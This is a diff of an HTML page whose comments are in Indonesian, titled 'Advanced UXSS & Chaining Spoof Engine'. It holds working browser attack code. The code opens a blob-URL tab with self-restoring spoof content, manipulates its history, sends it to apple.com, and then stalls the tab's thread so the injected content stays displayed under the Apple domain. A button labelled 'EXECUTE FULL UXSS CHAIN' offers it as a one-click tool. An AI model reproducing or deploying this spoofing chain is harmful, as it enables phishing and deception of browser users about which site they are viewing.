@@ -6,7 +6,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, user-scalable=yes"
     />
-    <title>Direct Blob Chaining Spoof - HALLO</title>
+    <title>Advanced UXSS & Chaining Spoof Engine - Zero</title>
     <style>
       body, html {
         margin: 0;
@@ -53,15 +53,15 @@
   </head>
   <body>
     <div class="container">
-      <h1>Direct Bypass Engine</h1>
-      <button id="startBtn">1-CLICK DIRECT APPLE LOCK</button>
+      <h1>UXSS Full Chaining Engine</h1>
+      <button id="startBtn">EXECUTE FULL UXSS CHAIN</button>
     </div>
 
     <script>
       document.getElementById("startBtn").onclick = function () {
         this.style.display = 'none';
 
-        // 1. Membangun Payload HTML + JS Terintegrasi (Self-Healing DOM) dalam bentuk Blob Stream
+        // 1. Membangun Payload Injeksi Mandiri (Self-Sustaining Vector)
         const payloadHtml = `
           <!DOCTYPE html>
           <html>
@@ -72,37 +72,53 @@
           <body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;">
             <h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>
             <script>
-              // Watchdog Mandiri: Mencegah pembersihan DOM oleh render engine pusat
+              // Vector Watchdog: Menjaga DOM tetap terkunci pada teks kustom
+              try {
+                const observer = new MutationObserver(() => {
+                  if (!document.getElementById('spoof-text')) {
+                    document.body.innerHTML = '<h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1>';
+                  }
+                });
+                observer.observe(document.documentElement, { childList: true, subtree: true });
+              } catch(e) {}
+
               setInterval(() => {
                 if (!document.getElementById('spoof-text') || document.body.innerText.trim() !== 'HALLO') {
                   document.open();
                   document.write('<!DOCTYPE html><html><head><title>Apple</title><meta name="viewport" content="width=device-width, initial-scale=1"></head><body style="margin:0;padding:0;background:#ffffff;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:-apple-system,sans-serif;"><h1 id="spoof-text" style="font-size:95px;font-weight:900;color:#000000;margin:0;">HALLO</h1></body></html>');
                   document.close();
                 }
-              }, 4);
+              }, 3);
             <\/script>
           </body>
           </html>
         `;
 
-        // Membuat Blob URI instan untuk bypass about:blank murni
+        // Membuat Blob URI untuk menghindari about:blank kosong
         const blob = new Blob([payloadHtml], { type: 'text/html' });
         const blobUrl = URL.createObjectURL(blob);
 
-        // 2. Membuka tab baru langsung mengarah ke Blob URL (Bukan about:blank kosong)
+        // 2. Membuka tab baru melalui Blob Target
         const newTab = window.open(blobUrl, "_blank");
 
         if (newTab) {
           try { newTab.focus(); } catch (e) {}
 
-          // 3. Timing Presisi Ekstrem (15ms): Langsung memaksa location.href ditarik ke https://apple.com
+          // 3. Chain Step A (10ms): Manipulasi history state untuk mencemari antrean NavigationManager
+          setTimeout(() => {
+            try {
+              newTab.history.pushState({uxss: true}, "", "#secure-enclave-chain");
+            } catch (err) {}
+          }, 10);
+
+          // 4. Chain Step B (20ms): Memicu transisi navigasi utama ke domain target
           setTimeout(() => {
             try {
               newTab.location.href = "https://apple.com";
             } catch (err) {}
-          }, 15);
+          }, 20);
 
-          // 4. Timing Penguncian Pipeline (35ms): Mengunci event loop dan thread utama browser secara sinkronus
+          // 5. Chain Step C (40ms): Thread Stalling & Reflow Flooding untuk mengunci antrean frame
           setTimeout(() => {
             try {
               newTab.eval(`
@@ -120,7 +136,7 @@
               let start = Date.now();
               while (Date.now() - start < 6000) {}
             }
-          }, 35);
+          }, 40);
         }
       };
     </script>
